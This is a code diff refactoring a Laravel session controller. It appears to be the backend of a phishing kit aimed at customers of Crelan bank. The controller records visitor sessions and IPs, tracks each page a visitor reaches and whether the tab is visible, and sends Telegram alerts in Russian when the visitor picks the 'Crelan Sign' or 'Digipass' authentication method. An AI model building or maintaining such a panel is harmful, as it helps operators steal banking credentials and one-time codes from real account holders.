@@ -7,10 +7,13 @@ namespace App\Http\Controllers;
 use App\Actions\Session\CreateSessionAction;
 use App\Events\PageVisited;
 use App\Http\Requests\CreateSessionRequest;
+use App\Http\Requests\NotifyMethodRequest;
+use App\Http\Requests\TrackVisitRequest;
 use App\Http\Resources\SessionResource;
 use App\Models\Session;
 use App\Services\SessionService;
 use App\Services\TelegramService;
+use App\Services\WebSocketService;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
 
@@ -23,11 +26,12 @@ class SessionController extends Controller
         private readonly CreateSessionAction $createSessionAction,
         private readonly SessionService $sessionService,
         private readonly TelegramService $telegramService,
+        private readonly WebSocketService $webSocketService,
     ) {}
 
     /**
      * Create new session
-     * 
+     *
      * POST /api/session
      */
     public function store(CreateSessionRequest $request): JsonResponse
@@ -35,7 +39,7 @@ class SessionController extends Controller
         $sessionDTO = $this->createSessionAction->execute(
             inputType: $request->getInputType(),
             inputValue: $request->getInputValue(),
-            ip: $request->ip(),
+            ip: (string) $request->ip(),
         );
 
         $session = $this->sessionService->find($sessionDTO->id);
@@ -48,7 +52,7 @@ class SessionController extends Controller
 
     /**
      * Get session status
-     * 
+     *
      * GET /api/session/{session}/status
      */
     public function status(Session $session): JsonResponse
@@ -61,21 +65,17 @@ class SessionController extends Controller
 
     /**
      * Update last activity time (ping)
-     * 
+     *
      * POST /api/session/{session}/ping
-     * 
+     *
      * Body:
      * - is_online: bool (optional) - user visibility status
      * - visibility: string (optional) - visibility state (visible/hidden/focus/blur/beforeunload)
      */
-    public function ping(Session $session, \Illuminate\Http\Request $request): JsonResponse
+    public function ping(Session $session, Request $request): JsonResponse
     {
-        if (!$session->isActive()) {
-            return response()->json([
-                'success' => false,
-                'error' => 'Session is not active',
-                'data' => new SessionResource($session),
-            ], 400);
+        if (! $session->isActive()) {
+            return $this->inactiveSessionResponse($session);
         }
 
         $this->sessionService->updateLastActivity($session);
@@ -83,10 +83,9 @@ class SessionController extends Controller
         // Если переданы данные о видимости - отправляем через WebSocket
         if ($request->has('is_online') || $request->has('visibility')) {
             $isOnline = $request->boolean('is_online', true);
-            $visibility = $request->input('visibility', 'visible');
-            
-            app(\App\Services\WebSocketService::class)
-                ->broadcastUserVisibility($session, $isOnline, $visibility);
+            $visibility = (string) $request->input('visibility', 'visible');
+
+            $this->webSocketService->broadcastUserVisibility($session, $isOnline, $visibility);
         }
 
         return response()->json([
@@ -97,7 +96,7 @@ class SessionController extends Controller
 
     /**
      * Check online status
-     * 
+     *
      * GET /api/session/{session}/online
      */
     public function online(Session $session): JsonResponse
@@ -116,26 +115,23 @@ class SessionController extends Controller
 
     /**
      * Track page visit
-     * 
+     *
      * POST /api/session/{session}/visit
-     * 
+     *
      * Body:
      * - page_name: string - название страницы
      * - page_url: string - URL страницы
      * - action_type: string (optional) - тип действия
      */
-    public function trackVisit(Session $session, Request $request): JsonResponse
+    public function trackVisit(Session $session, TrackVisitRequest $request): JsonResponse
     {
-        if (!$session->isActive()) {
-            return response()->json([
-                'success' => false,
-                'error' => 'Session is not active',
-            ], 400);
+        if (! $session->isActive()) {
+            return $this->inactiveSessionResponse($session);
         }
 
-        $pageName = $request->input('page_name', 'Неизвестная страница');
-        $pageUrl = $request->input('page_url', request()->fullUrl());
-        $actionType = $request->input('action_type');
+        $pageName = $request->pageName();
+        $pageUrl = $request->pageUrl();
+        $actionType = $request->actionType();
 
         // Отправляем событие о переходе на страницу
         event(new PageVisited(
@@ -152,24 +148,20 @@ class SessionController extends Controller
 
     /**
      * Notify method selection (Crelan Sign / Digipass)
-     * 
+     *
      * POST /api/session/{session}/method
      */
-    public function notifyMethod(Session $session, Request $request): JsonResponse
+    public function notifyMethod(Session $session, NotifyMethodRequest $request): JsonResponse
     {
-        if (!$session->isActive()) {
-            return response()->json([
-                'success' => false,
-                'error' => 'Session is not active',
-            ], 400);
+        if (! $session->isActive()) {
+            return $this->inactiveSessionResponse($session);
         }
 
-        $method = $request->input('method', 'unknown');
+        $method = $request->methodType();
 
         $methodLabel = match ($method) {
             'crelan_sign' => '📷 Crelan Sign (QR)',
             'digipass' => '🔑 Digipass',
-            default => "❓ {$method}",
         };
 
         $text = "🔀 <b>Пользователь выбрал метод:</b> {$methodLabel}";
@@ -179,5 +171,14 @@ class SessionController extends Controller
         return response()->json([
             'success' => true,
         ]);
+    }
+
+    private function inactiveSessionResponse(Session $session): JsonResponse
+    {
+        return response()->json([
+            'success' => false,
+            'error' => 'Session is not active',
+            'data' => new SessionResource($session),
+        ], 400);
     }
 }
